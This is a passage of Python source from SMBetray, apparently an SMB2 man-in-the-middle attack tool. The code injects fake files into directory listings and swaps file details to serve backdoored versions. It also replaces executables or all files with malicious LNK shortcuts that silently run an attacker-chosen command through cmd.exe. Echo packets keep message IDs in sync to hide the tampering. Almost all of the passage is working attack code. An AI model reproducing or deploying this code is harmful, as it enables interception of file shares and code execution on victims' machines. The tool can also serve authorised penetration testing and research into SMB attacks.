			self.logger.debug("[SMB2_Lib::findResp_injectFileListing] Hit a no-more-files packet, can't inject on this one")
			return packet
		resp = SMB2QueryDirectory_Response(packet['Data'])
		# Grab a copy for editing
		data = copy.deepcopy(resp['Buffer']) 
		#If there's no data for some reason, fall back
		if(len(str(data)) == 0):
			self.logger.debug("[SMB2_Lib::findResp_injectFileListing] No data in the query directory response")
			return packet	
		nextOffset = 1
		buff = ''
		while nextOffset != 0:
			try:
				fileInfo 	= None
				inject 		= None
				if(infoType == FILEID_BOTH_DIRECTORY_INFORMATION):
					fileInfo = smb.SMBFindFileIdBothDirectoryInfo(smb.SMB.FLAGS2_UNICODE)
					fileInfo.fromString(data)
					inject = copy.deepcopy(fileInfo)
				elif(infoType == FILE_BOTH_DIRECTORY_INFORMATION):
					fileInfo = smb.SMBFindFileBothDirectoryInfo(smb.SMB.FLAGS2_UNICODE)
					fileInfo.fromString(data)
					inject = copy.deepcopy(fileInfo)
				## TODO: Add more infoType handlers
				else:
					self.logger.info("[SMB2_Lib::findResp_injectFileListing] infoType not recognized (" + str(infoType) + ")")
					return packet
				
				nextOffset = fileInfo['NextEntryOffset']
				if(nextOffset == 0):
					# Modify the next-offset
					fileInfo['NextEntryOffset'] = len(str(fileInfo)) + ((8 - (len(str(fileInfo)) % 8)) % 8)
					# Build our custom file 
					inject['FileName'] 			= fileName
					inject['FileNameLength'] 	= len(inject['FileName'])
					inject['EndOfFile'] 		= int(fileRequestStruct.FILE_BYTE_SIZE) # File does not need to be in unicode
					inject['AllocationSize'] 	= int(inject['EndOfFile'] + ((8 - (inject['EndOfFile'] % 8)) % 8))
					inject['ExtFileAttributes'] = int(32)
					
					# Add the original file
					buff += str(fileInfo)
					buff += str('\x00' * ((8 - (len(str(fileInfo)) % 8)) % 8))
					
					# Now, inject our custom one
					buff += str(inject)
					buff += str('\x00' * 2)#((8 - (len(str(inject)) % 8)) % 8))

					# Add this file (full path) to the record of fake files we injected

					#
					directoryName 	= self.REQUEST_TRACKER[packet['MessageID']].FILE_NAME
					if(directoryName == "." or directoryName == ".\\"):
						self.INJECTED_FILE_TRACKER[fileRequestStruct.FILE_NAME] = fileRequestStruct
					else:
						self.INJECTED_FILE_TRACKER[str(directoryName + "\\" + fileRequestStruct.FILE_NAME)] = fileRequestStruct
					self.logger.info("Injected " + directoryName + "\\" + fileRequestStruct.FILE_NAME)

				else:
					# Just add the file
					buff += str(fileInfo)
					buff += str('\x00' * ((8 - (len(str(fileInfo)) % 8)) % 8))
				data = data[nextOffset:]
			except Exception, e:
				m = self.logger.error(str(traceback.format_exc()))
				self.logger.error("[SMB2_Lib::findResp_injectFileListing] " + str(m))
				break
		# Do math and pack it up 
		resp['Buffer'] 				= str(buff) + ('\x00' * ((8 - (len(str(buff)) % 8)) % 8))
		resp['_Buffer'] 			= len(str(buff)) + ((8 - (len(str(buff)) % 8)) % 8)
		resp['OutputBufferLength'] 	= len(str(buff)) + ((8 - (len(str(buff)) % 8)) % 8)
		packet['Data'] = str(resp)
		return packet
	# 	Responds appropriately to a create-request (takes in the original create request packet)
	def createResp_injectFile(self, packet, fileStruct):
		size 	= fileStruct.FILE_BYTE_SIZE
		req 	= SMB2Create(packet['Data'])
		resp 	= SMB2Create_Response()
		
		# Generate a random, but valid, date & time
		fTime  = randint(1355314322, 1481544732) 
		fTime *= 10000000
		fTime += 116444736000000000

		resp['FileID'] 			= fileStruct.FILE_GUID
		resp['CreateAction'] 	= req['CreateDisposition']
		resp['OplockLevel'] 	= req['RequestedOplockLevel']
		resp['CreationTime']   = fTime
		resp['LastAccessTime'] = fTime
		resp['ChangeTime']     = fTime
		resp['LastWriteTime']  = fTime
		resp['AllocationSize'] = size + ((8 - (size % 8)) % 8)
		resp['EndOfFile']      = size
		resp['FileAttributes'] = 0
		newBuff = "" # 

		infoOffset = int(req['CreateContextsOffset'])
		infoLength = int(req['CreateContextsLength'])
		data = copy.deepcopy(req['Buffer'])

		index = infoOffset  - 120 # Don't ask me why, I have no answers for you
		nextOffset = 0
		if(infoLength > 0):
			nextOffset = 1
		while nextOffset > 0:
			n = SMB2CreateContext(data[index:index + 16])
			nextOffset 		= n['Next']
			# Reset the buffer with the appropriate scope
			if(nextOffset == 0):
				n['Buffer'] 	= data[index + 16:]
			else:
				n['Buffer'] 	= data[index + 16:index + nextOffset]
			tag 			= data[index + n['NameOffset']:index + n['NameOffset'] + n['NameLength']]
			index = index + nextOffset
			if(tag == "RqLs"):
				offset = n['NameLength'] + ((8 - (n['NameLength'] % 8)) % 8) #It's either this, or NameLength + 4
				rawData = n['Buffer'][offset:]
				i = 52 - len(rawData)
				rawData += '\x00' * i
				lease = SMB2_CREATE_REQUEST_LEASE_V2(rawData)
				newLease = copy.deepcopy(lease)
				newLease['Flags'] 		= 4
				newLease['LeaseState'] 	= 3
				newLease['Epoch'] 		= 1
				n['Buffer'] = str(tag) + "\x00\x00\x00\x00" + str(newLease)
				#n['Buffer'] = str(newLease)
			elif(tag == "MxAc"):
				maxrep = SMB2_CREATE_QUERY_MAXIMAL_ACCESS_RESPONSE()
				maxrep['QueryStatus'] 		= 0
				maxrep['MaximalAccess'] 	= 1179817
				#fkLen = len(str(maxrep))
				n['Buffer'] = str(tag) + "\x00\x00\x00\x00" + str(maxrep)
			elif(tag == "QFid"):
				qfid = SMB2_CREATE_QUERY_ON_DISK_ID()
				fid = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16)).encode("utf-16le")
				#fkLen = len(str(qfid))
				n['Buffer'] = str(tag) + "\x00\x00\x00\x00" + str(qfid)
			elif(tag == "DH2Q"):
				dh2q = SMB2_CREATE_DURABLE_HANDLE_RESPONSE_V2()
				dh2q['Timeout'] = 180000
				dh2q['Flags'] = 0
				#fkLen = len(str(dh2q))
				n['Buffer'] = str(tag) + "\x00\x00\x00\x00" + str(dh2q)
			elif(tag == "DHnQ"): #Idek dude
				dh2q = SMB2_CREATE_DURABLE_HANDLE_RESPONSE_V2()
				dh2q['Timeout'] = 180000
				dh2q['Flags'] = 0
				n['Buffer'] = str(tag) + "\x00\x00\x00\x00" + str(dh2q)
			else:
				self.logger.error("[getReqForge] unknown tag recieved: '" + str(tag) + "'")
			
			# Add it all up and add it to the packet's buffer

			n['DataLength'] = len(str(n['Buffer'])) - (n['NameLength'] + 4) #The 4 are the 4 reserved bytes
			if(nextOffset != 0):
				n['Next'] = len(str(n))# + n['NameLength'] #+ 4
			#
			newBuff += str(n)
		
		resp['Buffer'] = str(newBuff)
		resp['CreateContextsOffset'] = 152
		resp['CreateContextsLength'] = len(str(newBuff))
		return str(resp)  
	# 	Respond to the client with a getInfoResp for a file we're injecting
	def getInfoResp_injectFile(self, packet, fileStruct):
		# Get the infotype from the client's request packet
		tmp 		= SMB2QueryInfo(packet['Data'])
		infoType 	= tmp['FileInfoClass']

		# Generate a random, but valid, date & time
		fTime  = randint(1355314322, 1481544732) 
		fTime *= 10000000
		fTime += 116444736000000000

		# Build the inner of the packet
		inner = SMB2QueryInfo_Response()
		
		size = fileStruct.FILE_BYTE_SIZE
		if infoType == smb.SMB_QUERY_FILE_BASIC_INFO:
			infoRecord = smb.SMBQueryFileBasicInfo()
			infoRecord['CreationTime'] 		= fTime
			infoRecord['LastAccessTime']	= fTime
			infoRecord['LastWriteTime'] 	= fTime 
			infoRecord['ExtFileAttributes'] = 0
		elif infoType == SMB2_0_INFO_SECURITY or infoType == SMB2_SEC_INFO_00:
			infoRecord = FileSecInformation()
			infoRecord['Revision'] 	= 1
			infoRecord['Type'] 		= -30720 # Fuck this shit
			infoRecord['OffsetToOwner']	= 0
			infoRecord['OffsetToGroup']	= 0
			infoRecord['OffsetToSACL']	= 0
			infoRecord['OffsetToDACL']	= 0
		elif infoType == SMB2_FILE_NETWORK_OPEN_INFO:
			infoRecord = smb.SMBFileNetworkOpenInfo()
			infoRecord['CreationTime'] 		= fTime
			infoRecord['LastAccessTime']	= fTime 
			infoRecord['LastWriteTime'] 	= fTime
			infoRecord['ChangeTime'] 		= fTime
			infoRecord['AllocationSize']    = size + ((8 - (size % 8)) % 8)
			infoRecord['EndOfFile']         = size
			infoRecord['FileAttributes'] 	= 32 #Archived change
		elif infoType == smb.SMB_QUERY_FILE_EA_INFO or infoType == SMB2_FILE_EA_INFO: 
			infoRecord 				= smb.SMBQueryFileEaInfo()
			infoRecord['EaSize'] 	= 0
		elif infoType == SMB2_FILE_STREAM_INFO:
			infoRecord = smb.SMBFileStreamInformation()
			infoRecord['NextEntryOffset'] 		= 0 
			infoRecord['StreamName'] 			= "::$DATA"
			infoRecord['StreamNameLength'] 		= 14
			infoRecord['StreamSize'] 			= size
			infoRecord['StreamAllocationSize']	= size + ((8 - (size % 8)) % 8)
		elif infoType == SMB2_FILE_INTERNAL_INFO:
			infoRecord = FileInternalInformation()
			infoRecord['IndexNumber'] = 0
		elif infoType == SMB2_FILESYSTEM_VOLUME_INFO:
			infoRecord = smb.SMBQueryFsVolumeInfo()
			infoRecord['VolumeCreationTime'] 	= fTime
			infoRecord['SerialNumber'] 			= randint(1, 3941952949)
			infoRecord['VolumeLabel'] 			= ''
			infoRecord['VolumeLabelSize'] 		= 498 #len(infoRecord['VolumeLabel'])
		elif infoType == SMB2_FILESYSTEM_ATTRIBUTE_INFO:
			infoRecord = smb.SMBQueryFsAttributeInfo()
			infoRecord['FileSystemAttributes']      = 13041919
			infoRecord['MaxFilenNameLengthInBytes'] = 255
			infoRecord['LengthOfFileSystemName']    = len("NTFS".encode("utf-16le"))
			infoRecord['FileSystemName']            = "NTFS".encode('utf-16le')
		else:
			self.logger.error("[SMB2_Lib::getInfoResp_injectFile] Unsupported infotype requested: " + str(infoType))
			return packet
		inner['Buffer'] = str(infoRecord)
		inner['OutputBufferLength'] = len(infoRecord)
		inner['OutputBufferOffset'] = 0x48
		return str(inner)
	# 	Respond to the client with the contents of the injected file
	def readResp_injectFile(self, packet, fileStruct):
		req 	= SMB2Read(packet['Data'])
		resp 	= SMB2Read_Response()

		resp['DataOffset']    	= 0x50
		resp['DataLength']    	= int(req['Length'])
		resp['DataRemaining'] 	= int(int(fileStruct.FILE_BYTE_SIZE) - int(req['Offset']))

		handle 					= open(fileStruct.LOCAL_FILE_PATH)
		handle.seek(int(req['Offset']))
		dataToSend 				= handle.read()[:req['Length']]
		handle.close()
		resp['Buffer']    		= str(dataToSend)
		self.logger.info("Serving up an injected file " + self.REQUEST_TRACKER[int(packet['MessageID'])].FILE_NAME + " - part " + str(int(req['Offset']) + int(req['Length'])) + "/" + str(fileStruct.FILE_BYTE_SIZE))
		
		return str(resp)
	# 	Responds appropriately to a close-request (takes in the original close request packet)
	def closeResp_injectFile(self):
		resp 	= SMB2Close_Response()
		return str(resp)  
	#<FILE BACKDOORING ATTACKS>#
	# 	File backdooring operates the same as file injections - 
	# 	the only difference is how SMBetray handles the findResponses
	# 	
	# Swap out the size details of targeted files, by their name, in a directory listing. 
	def findResp_backdoorFileNameModifyListing(self, packet, infoType):
		targetList = []
		# For every file we are backdooring, check if it's in this directory listing
		for fileName, fileStruct in self.BACKDOOR_FILE_SWAP_LIBRARY.iteritems():
			targetList.append(fileName.encode("utf-16-le").lower())
			
		if(packet['Status'] == nt_errors.STATUS_NO_MORE_FILES):
			return packet
		resp = SMB2QueryDirectory_Response(packet['Data'])
		# Grab a copy for editing
		data = copy.deepcopy(resp['Buffer']) 
		#If there's no data for some reason, fall back
		if(len(str(data)) == 0):
			return packet	
		nextOffset = 1
		buff = ''
		while nextOffset != 0:
			try:
				fileInfo 	= None
				inject 		= None
				if(infoType == FILEID_BOTH_DIRECTORY_INFORMATION):
					fileInfo = smb.SMBFindFileIdBothDirectoryInfo(smb.SMB.FLAGS2_UNICODE)
					fileInfo.fromString(data)
					inject = copy.deepcopy(fileInfo)
				elif(infoType == FILE_BOTH_DIRECTORY_INFORMATION):
					fileInfo = smb.SMBFindFileBothDirectoryInfo(smb.SMB.FLAGS2_UNICODE)
					fileInfo.fromString(data)
					inject = copy.deepcopy(fileInfo)
				## TODO: Add more infoType handlers
				else:
					self.logger.info("[SMB2_Lib::findResp_backdoorFileNameModifyListing] infoType not recognized (" + str(infoType) + ")")
					return packet

				nextOffset = fileInfo['NextEntryOffset']
				if(fileInfo['FileName'].lower() in targetList):
					tmp 				= fileInfo['FileName'].lower().decode("utf-16-le").encode("utf-8").lower()
					fileRequestStruct 	= self.BACKDOOR_FILE_SWAP_LIBRARY[tmp]

					fileInfo['EndOfFile'] 		= int(fileRequestStruct.FILE_BYTE_SIZE) # File does not need to be in unicode
					fileInfo['AllocationSize'] 	= int(fileInfo['EndOfFile'] + ((8 - (fileInfo['EndOfFile'] % 8)) % 8))
					fileInfo['NextEntryOffset'] = len(str(fileInfo)) + ((8 - (len(str(fileInfo)) % 8)) % 8)
					
					# Add to the injected files tracker
					directoryName 	= self.REQUEST_TRACKER[packet['MessageID']].FILE_NAME
					if(directoryName == "." or directoryName == ".\\"):
						self.INJECTED_FILE_TRACKER[fileRequestStruct.FILE_NAME] = fileRequestStruct
					else:
						self.INJECTED_FILE_TRACKER[str(directoryName + "\\" + fileRequestStruct.FILE_NAME)] = fileRequestStruct

					self.logger.info("Backdooring file size details for " + directoryName + "\\" + fileRequestStruct.FILE_NAME)

				buff += str(fileInfo)
				buff += str('\x00' * ((8 - (len(str(fileInfo)) % 8)) % 8))
				data = data[nextOffset:]
				continue				
			except Exception, e:
				m = self.logger.error(str(traceback.format_exc()))
				self.logger.error("[SMB2_Lib::findResp_backdoorFileNameModifyListing] " + str(m))
				break
		# Do math and pack it up 
		resp['Buffer'] 				= str(buff) + ('\x00' * ((8 - (len(str(buff)) % 8)) % 8))
		resp['_Buffer'] 			= len(str(buff)) + ((8 - (len(str(buff)) % 8)) % 8)
		resp['OutputBufferLength'] 	= len(str(buff)) + ((8 - (len(str(buff)) % 8)) % 8)
		packet['Data'] = str(resp)
		return packet	
	# Swap out the size details of targeted files, by their name, in a directory listing. 
	def findResp_backdoorFileExtensionModifyListing(self, packet, infoType):
		targetList = []
		# For every file we are backdooring, check if it's in this directory listing
		for extension, fileStruct in self.BACKDOOR_EXT_SWAP_LIBRARY.iteritems():
			targetList.append(extension)
			
		if(packet['Status'] == nt_errors.STATUS_NO_MORE_FILES):
			return packet
		resp = SMB2QueryDirectory_Response(packet['Data'])
		# Grab a copy for editing
		data = copy.deepcopy(resp['Buffer']) 
		#If there's no data for some reason, fall back
		if(len(str(data)) == 0):
			return packet	
		nextOffset = 1
		buff = ''
		while nextOffset != 0:
			try:
				fileInfo 	= None
				inject 		= None
				if(infoType == FILEID_BOTH_DIRECTORY_INFORMATION):
					fileInfo = smb.SMBFindFileIdBothDirectoryInfo(smb.SMB.FLAGS2_UNICODE)
					fileInfo.fromString(data)
					inject = copy.deepcopy(fileInfo)
				elif(infoType == FILE_BOTH_DIRECTORY_INFORMATION):
					fileInfo = smb.SMBFindFileBothDirectoryInfo(smb.SMB.FLAGS2_UNICODE)
					fileInfo.fromString(data)
					inject = copy.deepcopy(fileInfo)
				## TODO: Add more infoType handlers
				else:
					self.logger.info("[SMB2_Lib::findResp_backdoorFileNameModifyListing] infoType not recognized (" + str(infoType) + ")")
					return packet

				nextOffset = fileInfo['NextEntryOffset']

				tmp = fileInfo['FileName'].decode("utf-16-le").encode("utf-8")
				ext = tmp[tmp.rfind(".", 0, len(tmp))+1:].lower()

				if(ext in targetList):
					fileRequestStruct 	= self.BACKDOOR_EXT_SWAP_LIBRARY[ext]

					fileRequestStruct.FILE_NAME = fileInfo['FileName'].decode("utf-16-le").encode("utf-8")
					fileInfo['EndOfFile'] 		= int(fileRequestStruct.FILE_BYTE_SIZE) # File does not need to be in unicode
					fileInfo['AllocationSize'] 	= int(fileInfo['EndOfFile'] + ((8 - (fileInfo['EndOfFile'] % 8)) % 8))
					fileInfo['NextEntryOffset'] = len(str(fileInfo)) + ((8 - (len(str(fileInfo)) % 8)) % 8)
					
					# Add to the injected files tracker
					directoryName 	= self.REQUEST_TRACKER[packet['MessageID']].FILE_NAME
					if(directoryName == "." or directoryName == ".\\"):
						self.INJECTED_FILE_TRACKER[fileRequestStruct.FILE_NAME] = fileRequestStruct
					else:
						self.INJECTED_FILE_TRACKER[str(directoryName + "\\" + fileRequestStruct.FILE_NAME)] = fileRequestStruct

					self.logger.info("Backdooring file size details for " + directoryName + "\\" + fileRequestStruct.FILE_NAME)
				buff += str(fileInfo)
				buff += str('\x00' * ((8 - (len(str(fileInfo)) % 8)) % 8))
				data = data[nextOffset:]

				continue				

			except Exception, e:
				m = self.logger.error(str(traceback.format_exc()))
				self.logger.error("[SMB2_Lib::findResp_backdoorFileNameModifyListing] " + str(m))
				break
		# Do math and pack it up 
		resp['Buffer'] 				= str(buff) + ('\x00' * ((8 - (len(str(buff)) % 8)) % 8))
		resp['_Buffer'] 			= len(str(buff)) + ((8 - (len(str(buff)) % 8)) % 8)
		resp['OutputBufferLength'] 	= len(str(buff)) + ((8 - (len(str(buff)) % 8)) % 8)
		packet['Data'] = str(resp)
		return packet	
	

	#<LNK SWAP ATTACKS>#
	#	Replaces any file with an exectuable extension with, instead, lnk with the same name set to run our custom command
	def findResp_lnkSwapExec(self, packet, infoType):
		if(packet['Status'] == nt_errors.STATUS_NO_MORE_FILES):
			return packet
		resp = SMB2QueryDirectory_Response(packet['Data'])
		# Grab a copy for editing
		data = copy.deepcopy(resp['Buffer']) 
		#If there's no data for some reason, fall back
		if(len(str(data)) == 0):
			# self.logger.debug("[SMB2_Lib::findResp_lnkSwapAll] No data in the query directory response")
			return packet	
		
		nextOffset = 1
		buff = ''

		while nextOffset != 0:
			try:
				fileInfo = None
				if(infoType == FILEID_BOTH_DIRECTORY_INFORMATION):
					fileInfo = smb.SMBFindFileIdBothDirectoryInfo(smb.SMB.FLAGS2_UNICODE)
					fileInfo.fromString(data)
				elif(infoType == FILE_BOTH_DIRECTORY_INFORMATION):
					fileInfo = smb.SMBFindFileBothDirectoryInfo(smb.SMB.FLAGS2_UNICODE)
					fileInfo.fromString(data)
				else:
					self.logger.info("Unknown infoType " + hex(infoType) + " returning")
					return packet
				if(fileInfo == None):
					return packet
				if fileInfo == None:
					return packet

				nextOffset = fileInfo['NextEntryOffset']

				# It's a folder, move along
				if (fileInfo['ExtFileAttributes'] & smb.SMB_FILE_ATTRIBUTE_DIRECTORY == smb.SMB_FILE_ATTRIBUTE_DIRECTORY):
					#self.logger.info("IT'S A FOLDER DUDE")
					buff += str(fileInfo)
					buff += str('\x00' * ((8 - (len(str(fileInfo)) % 8)) % 8))
					data = data[nextOffset:]
					continue
				else:
					# If it's an executable file of some sort
					old = fileInfo['FileName'].decode("utf-16-le").encode("utf-8")
					global EXECUTABLE_EXTENSIONS
					if old[old.rfind(".", 0, len(old))+1:].lower() not in EXECUTABLE_EXTENSIONS:
						buff += str(fileInfo)
						buff += str('\x00' * ((8 - (len(str(fileInfo)) % 8)) % 8))
						data = data[nextOffset:]
						continue

					new = (old[:old.rfind(".", 0, len(old))] + ".lnk").encode("utf-16-le")
					badFile = self.genBadLnk(self.info['attackConfig'].LNK_SWAP_EXEC_ONLY)

					newStruct 					= FileRequestStruct()
					newStruct.FILE_NAME 		= new.decode("utf-16-le").encode("utf-8")
					newStruct.FILE_GUID			= ''.join([random.choice(string.letters) for i in range(16)])
					newStruct.FILE_BYTE_SIZE 	= int(os.stat(badFile).st_size)
					newStruct.LOCAL_FILE_PATH = badFile
					newStruct.IS_INJECTED_FILE = True

					directoryName 				= self.REQUEST_TRACKER[packet['MessageID']].FILE_NAME
					if(directoryName == "." or directoryName == ".\\"):
						self.INJECTED_FILE_TRACKER[newStruct.FILE_NAME] = newStruct
					else:
						self.INJECTED_FILE_TRACKER[str(directoryName + "\\" + newStruct.FILE_NAME)] = newStruct
					self.FILE_REQUEST_TRACKER[newStruct.FILE_GUID] = newStruct

					self.logger.info("LNKSwapping " + fileInfo['FileName'].decode("utf-16-le") + " with " + new.decode("utf-16-le"))

					# Generate a bad LNK file
					
					fileInfo['FileName'] 			= new
					fileInfo['FileNameLength'] 		= len(new)
					fileInfo['EndOfFile'] 			= int(os.stat(badFile).st_size)
					fileInfo['AllocationSize'] 		= int(fileInfo['EndOfFile'] + ((8 - (fileInfo['EndOfFile'] % 8)) % 8))
					fileInfo['ExtFileAttributes'] 	= 32
					if(fileInfo['NextEntryOffset'] != 0):
						fileInfo['NextEntryOffset'] 	= len(str(fileInfo)) + ((8 - (len(str(fileInfo)) % 8)) % 8)

					buff += str(fileInfo)
					buff += str('\x00' * ((8 - (len(str(fileInfo)) % 8)) % 8))
					data = data[nextOffset:]

					del(fileInfo)

			except Exception, e:
				m = self.logger.error(str(traceback.format_exc()))
				self.logger.error("[SMB2_Lib::findResp_injectFileListing] " + str(m))
				break


		resp['Buffer'] 				= str(buff) + ('\x00' * ((8 - (len(str(buff)) % 8)) % 8))
		resp['_Buffer'] 			= len(str(buff)) + ((8 - (len(str(buff)) % 8)) % 8)
		resp['OutputBufferLength'] 	= len(str(buff)) + ((8 - (len(str(buff)) % 8)) % 8)
		packet['Data'] = str(resp)
		return packet
	#	Replaces all files with, instead, lnk with the same name set to run our custom command
	def findResp_lnkSwapAll(self, packet, infoType):
		if(packet['Status'] == nt_errors.STATUS_NO_MORE_FILES):
			# self.logger.debug("[SMB2_Lib::findResp_lnkSwapAll] Hit a no-more-files packet, can't inject on this one")
			return packet
		resp = SMB2QueryDirectory_Response(packet['Data'])
		# Grab a copy for editing
		data = copy.deepcopy(resp['Buffer']) 
		#If there's no data for some reason, fall back
		if(len(str(data)) == 0):
			# self.logger.debug("[SMB2_Lib::findResp_lnkSwapAll] No data in the query directory response")
			return packet	
		
		nextOffset = 1
		buff = ''

		while nextOffset != 0:
			try:
				fileInfo = None
				if(infoType == FILEID_BOTH_DIRECTORY_INFORMATION):
					fileInfo = smb.SMBFindFileIdBothDirectoryInfo(smb.SMB.FLAGS2_UNICODE)
					fileInfo.fromString(data)
				elif(infoType == FILE_BOTH_DIRECTORY_INFORMATION):
					fileInfo = smb.SMBFindFileBothDirectoryInfo(smb.SMB.FLAGS2_UNICODE)
					fileInfo.fromString(data)
				else:
					self.logger.info("Unknown infoType " + hex(infoType) + " returning")
					return packet
				if(fileInfo == None):
					return packet
				if fileInfo == None:
					return packet

				nextOffset = fileInfo['NextEntryOffset']

				# It's a folder, move along
				if (fileInfo['ExtFileAttributes'] & smb.SMB_FILE_ATTRIBUTE_DIRECTORY == smb.SMB_FILE_ATTRIBUTE_DIRECTORY):
					#self.logger.info("IT'S A FOLDER DUDE")
					buff += str(fileInfo)
					buff += str('\x00' * ((8 - (len(str(fileInfo)) % 8)) % 8))
					data = data[nextOffset:]
					continue
				else:

					old = fileInfo['FileName'].decode("utf-16-le").encode("utf-8")
					new = (old[:old.rfind(".", 0, len(old))] + ".lnk").encode("utf-16-le")
					badFile = self.genBadLnk(self.info['attackConfig'].LNK_SWAP_ALL)

					newStruct 					= FileRequestStruct()
					newStruct.FILE_NAME 		= new.decode("utf-16-le").encode("utf-8")
					newStruct.FILE_GUID			= ''.join([random.choice(string.letters) for i in range(16)])
					newStruct.FILE_BYTE_SIZE 	= int(os.stat(badFile).st_size)
					newStruct.LOCAL_FILE_PATH = badFile
					newStruct.IS_INJECTED_FILE = True

					directoryName 				= self.REQUEST_TRACKER[packet['MessageID']].FILE_NAME
					if(directoryName == "." or directoryName == ".\\"):
						self.INJECTED_FILE_TRACKER[newStruct.FILE_NAME] = newStruct
					else:
						self.INJECTED_FILE_TRACKER[str(directoryName + "\\" + newStruct.FILE_NAME)] = newStruct
					self.FILE_REQUEST_TRACKER[newStruct.FILE_GUID] = newStruct

					self.logger.info("LNKSwapping " + fileInfo['FileName'].decode("utf-16-le") + " with " + new.decode("utf-16-le"))

					# Generate a bad LNK file
					
					fileInfo['FileName'] 			= new
					fileInfo['FileNameLength'] 		= len(new)
					fileInfo['EndOfFile'] 			= int(os.stat(badFile).st_size)
					fileInfo['AllocationSize'] 		= int(fileInfo['EndOfFile'] + ((8 - (fileInfo['EndOfFile'] % 8)) % 8))
					fileInfo['ExtFileAttributes'] 	= 32
					if(fileInfo['NextEntryOffset'] != 0):
						fileInfo['NextEntryOffset'] 	= len(str(fileInfo)) + ((8 - (len(str(fileInfo)) % 8)) % 8)

					# del(fileInfo)
					
					buff += str(fileInfo)
					buff += str('\x00' * ((8 - (len(str(fileInfo)) % 8)) % 8))
					data = data[nextOffset:]

					del(fileInfo)

			except Exception, e:
				m = self.logger.error(str(traceback.format_exc()))
				self.logger.error("[SMB2_Lib::findResp_injectFileListing] " + str(m))
				break


		resp['Buffer'] 				= str(buff) + ('\x00' * ((8 - (len(str(buff)) % 8)) % 8))
		resp['_Buffer'] 			= len(str(buff)) + ((8 - (len(str(buff)) % 8)) % 8)
		resp['OutputBufferLength'] 	= len(str(buff)) + ((8 - (len(str(buff)) % 8)) % 8)
		packet['Data'] = str(resp)
		return packet
	
	


	# 	This generates a simple SMB2 "ECHO" packet
	# 	to send to the server - keeping the message_id's 
	# 	in sync while we feed the victim a fake file/info. 
	# 	That way, when they eventually talk to each other
	# 	again, they have the same ID's and no clude that
	# 	we messed with them.
	def generateEchoRequest(self, packet):
		newPkt = SMB2Packet()
		newPkt['Command'] 		= SMB2_ECHO
		newPkt['Flags'] 		= 0
		if self.SESSION_SIGNED and self.KNOWN_KEY != None:
			newPkt['Flags'] 	= SMB2_FLAGS_SIGNED
		newPkt['MessageID'] 	= copy.deepcopy(packet['MessageID'])
		newPkt['NextCommand']	= 0
		newPkt['TreeID'] 		= copy.deepcopy(packet['TreeID'])
		newPkt['SessionID'] 	= copy.deepcopy(packet['SessionID'])
		echo = SMB2Echo()
		newPkt['Data'] = str(echo)
		return newPkt


	

	# Creates a malicious LNK and stores it somewhere
	# NOTICE: All credit goes to LnkUP author PlazMaz
	# since I copied a lot of his code into this
	def create_for_path(self, path, isdir):
		from datetime import datetime
		now = datetime.now()
		return {
			'type': pylnk.TYPE_FOLDER if isdir else pylnk.TYPE_FILE,
			'size': 272896,
			'created': now,
			'accessed': now,
			'modified': now,
			'name': path.split('\\')[0]
		}
	def for_file(self, target_file, lnk_name=None):
		# self.logger.info("Creating lnk...")
		lnk = pylnk.create(lnk_name)

		levels = target_file.split('\\')
		elements = [levels[0]]
		for level in levels[1:-1]:
			segment = self.create_for_path(level, True)
			elements.append(segment)
		segment = self.create_for_path(levels[-1], False)
		elements.append(segment)
		lnk.shell_item_id_list = pylnk.LinkTargetIDList()
		lnk.shell_item_id_list.items = elements
		# self.logger.info("Created! : " + lnk_name)
		return pylnk.from_segment_list(elements, lnk_name)
	def getIconPath(self, ext):
		knownPaths = {
			"doc" 	: ["C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\WORDICON.EXE", 9],
			"docx" 	: ["C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\WORDICON.EXE", 9]

			# "ppt" 	: "",
			# "pptx" 	: "",
			# "xls" 	: "",
			# "xlsx" 	: "",
			# "txt" 	: "",

			# "pdf" 	: "",
			# "msg"	: "",
			# "zip"	: "",
			
			# "png"	: "",
			# "jpeg" 	: "",
			# "jpg" 	: "",
			# "mp3" 	: "",
			# "mp4" 	: "",

			# "ini" 	: "",
			# "html"	: "",
			# "htm"	: "",
			# "js"	: "",
			# "vb"	: "",
			# "vbs"	: "",
			# "bat"	: "",
			# "com"	: "",
			# "cmd"	: "",
			# "reg"	: "",

			# "exe"	: "",
			# "msi"	: "",
			# "dll"	: "",
			# "asp"	: "",
			# "aspx"	: "",

			# "war"	: "",

			# "FOLDER" : "%SystemRoot%\\System32\\imageres.dll"
		}
		if ext in knownPaths:
			return knownPaths[ext]
		else:
			return None
	def genBadLnk(self, COMMAND_STRING):
		badLnk 	 	= tempfile.NamedTemporaryFile(delete = False)
		filepath 	= '{}/{}'.format(os.getcwd(), badLnk.name)
		link 		= self.for_file(r'C:\Windows\System32\cmd.exe', badLnk.name)
		link.arguments = '/c start /b ' + COMMAND_STRING
		link._set_window_mode(pylnk.WINDOW_MINIMIZED)

		link.save(badLnk.name)

		# self.logger.info("Bad LNK created: " + badLnk.name)

		return badLnk.name
	

	#<REQUIRED/CORE METHODS>#
	# self.CREATE_REQUEST_TRACKER[int(packet['MessageID'])] == The full file name requested to be opened
	# self.FILE_REQUEST_TRACKER[FILE_GUID] 					== The FileRequestStruct of the file requested
	# self.READ_REQUEST_TRACKER[packet['MessageID']] 		== The FileRequestStruct from self.FILE_REQUEST_TRACKER
	# self.FILE_INFO_CLASS_TRACKER[packet['MessageID']] 	== The infotype being requested in the message

	# Gets passed the data from the SMBetray(MiTMModule) parseClientRequest function
	def handleRequest(self, rawData):
		# time.sleep(.5)
		try:
			requests = self.splitSMBChainedMessages(rawData)
			for i in range(0, len(requests)):
				#<Required Methods>#
				# # Tree connect Request
				# if(requests[i]['Command'] == 3):
				# 	# Keep track of the requested file/directory
				# 	# this populates self.CREATE_REQUEST_TRACKER[int(packet['MessageID'])]
				# 	self.createReq_track(requests[i])

				# Negotiate Session Request
				if(requests[i]['Command'] == 0):
					self.negotiateReq_track(requests[i])
					pass
				# Session Setup Request
				if(requests[i]['Command'] == 1):
					#
					pass
				# Create Request
				if(requests[i]['Command'] == 5):
					# Keep track of the requested file/directory
					# this populates self.CREATE_REQUEST_TRACKER[int(packet['MessageID'])]
					self.createReq_track(requests[i])
				# Close Request
				if(requests[i]['Command'] == 6):
					# Keep track of the requested file/directory
					# this populates self.CREATE_REQUEST_TRACKER[int(packet['MessageID'])]
					self.closeReq_track(requests[i])
				# Read Request
				if(requests[i]['Command'] == 8):
					# Keep track of the requested file/directory
